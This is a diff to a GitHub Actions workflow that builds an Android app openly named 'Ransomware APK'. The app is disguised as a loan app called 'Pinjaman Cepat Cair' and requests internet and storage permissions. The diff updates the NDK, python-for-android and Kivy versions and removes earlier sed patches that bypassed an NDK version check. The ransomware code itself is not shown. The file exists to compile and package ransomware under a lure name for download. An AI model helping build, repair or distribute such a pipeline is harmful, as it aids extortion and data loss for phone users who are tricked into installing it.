@@ -1,4 +1,4 @@
-name: Build Ransomware APK
+name: Build Ransomware APK (with NDK 25)
 
 on:
   push:
@@ -37,14 +37,17 @@ jobs:
             pkg-config \
             cmake \
             libffi-dev \
-            libssl-dev
+            libssl-dev \
+            build-essential
 
-      - name: Install Python dependencies
+      - name: Install Python dependencies (with modern Kivy)
         run: |
           pip install --upgrade pip
           pip install cython virtualenv
-          pip install python-for-android==2023.9.16
-          pip install pycryptodome requests kivy==2.1.0
+          # Gunakan python-for-android versi terbaru yang kompatibel dengan NDK 25
+          pip install python-for-android==2024.1.21
+          # Gunakan Kivy versi terbaru (3.0.0+) yang support NDK 25
+          pip install pycryptodome requests kivy==3.0.0
 
       - name: Setup Android SDK
         run: |
@@ -54,82 +57,22 @@ jobs:
           unzip -q commandlinetools-linux-11076708_latest.zip
           mkdir -p cmdline-tools/latest
           mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
-          
           echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
           echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
-
-      - name: Download NDK r23b
-        run: |
-          mkdir -p $HOME/android-ndk
-          cd $HOME
-          wget -q https://dl.google.com/android/repository/android-ndk-r23b-linux.zip
-          unzip -q android-ndk-r23b-linux.zip -d $HOME/android-ndk
-          rm android-ndk-r23b-linux.zip
-          echo "ANDROID_NDK_HOME=$HOME/android-ndk/android-ndk-r23b" >> $GITHUB_ENV
 
       - name: Accept Android licenses
         run: |
           yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true
 
-      - name: Install SDK components
+      - name: Install SDK components (including NDK 25)
         run: |
+          # Install platform tools dan build tools
           $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"
+          # Install NDK versi 25.2.9519653 (versi spesifik dalam rilis 25)
+          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "ndk;25.2.9519653"
+          echo "ANDROID_NDK_HOME=$ANDROID_HOME/ndk/25.2.9519653" >> $GITHUB_ENV
 
-      - name: 🔥 PATCH PYTHON-FOR-ANDROID (NDK CHECK BYPASS)
-        run: |
-          SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
-          TARGET_FILE="$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py"
-          
-          echo "📍 Mencari file di: $TARGET_FILE"
-          
-          if [ -f "$TARGET_FILE" ]; then
-            echo "✅ File ditemukan, mempatch..."
-            
-            # Backup dulu
-            cp "$TARGET_FILE" "$TARGET_FILE.bak"
-            
-            # Ganti baris yang ngecek NDK version
-            # Cari baris: if int(ndk_major_version) < min_ndk_major:
-            # Ganti jadi: if False:
-            
-            sed -i 's/if int(ndk_major_version) < min_ndk_major:/if False:  # PATCHED BY T00LS-AI/g' "$TARGET_FILE"
-            
-            echo "✅ Patch selesai!"
-            echo "📄 Isi file setelah patch:"
-            grep -n "if False" "$TARGET_FILE" || echo "⚠️  Patch mungkin gagal"
-          else
-            echo "❌ File tidak ditemukan!"
-            echo "📁 Mencari di lokasi lain..."
-            find $SITE_PACKAGES -name "android_ndk.py" -type f
-          fi
-
-      - name: 🔥 PATCH BOOTSTRAP (FORCE NDK VERSION)
-        run: |
-          SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
-          TARGET_FILE="$SITE_PACKAGES/pythonforandroid/bootstrap.py"
-          
-          if [ -f "$TARGET_FILE" ]; then
-            echo "✅ Patch bootstrap.py"
-            cp "$TARGET_FILE" "$TARGET_FILE.bak"
-            
-            # Force ndk_major_version = 23
-            sed -i 's/self\.ndk_major_version = get_ndk_version(self\.ctx\.ndk_dir)/self.ndk_major_version = 23  # FORCE NDK 23/g' "$TARGET_FILE"
-            
-            echo "✅ Bootstrap patched!"
-          fi
-
-      - name: 🔥 VERIFIKASI PATCH
-        run: |
-          SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
-          echo "📁 Site packages: $SITE_PACKAGES"
-          echo ""
-          echo "📄 Isi android_ndk.py setelah patch:"
-          cat "$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py" | grep -A 5 -B 5 "if False" || echo "File tidak terbaca"
-          echo ""
-          echo "📄 Isi bootstrap.py setelah patch:"
-          cat "$SITE_PACKAGES/pythonforandroid/bootstrap.py" | grep -A 5 -B 5 "self.ndk_major_version" || echo "File tidak terbaca"
-
-      - name: 🚀 BUILD APK (PASTI JADI)
+      - name: 🚀 Build APK (with NDK 25)
         run: |
           p4a apk \
             --private . \
@@ -137,7 +80,7 @@ jobs:
             --name="Pinjaman Cepat Cair" \
             --version=1.0 \
             --bootstrap=sdl2 \
-            --requirements=python3,kivy==2.1.0,requests,pycryptodome \
+            --requirements=python3,kivy==3.0.0,requests,pycryptodome \
             --permission INTERNET \
             --permission READ_EXTERNAL_STORAGE \
             --permission WRITE_EXTERNAL_STORAGE \
@@ -148,11 +91,11 @@ jobs:
             --android_api=31 \
             --minsdk=21 \
             --release \
-            --verbose  # Biar keliatan prosesnya
+            --verbose
 
-      - name: 📦 UPLOAD APK
+      - name: 📦 Upload APK
         uses: actions/upload-artifact@v4
         with:
           name: ransomware-apk
           path: ./*.apk
-          if-no-files-found: error  # Kalo gak ada APK, dianggep error
+          if-no-files-found: error
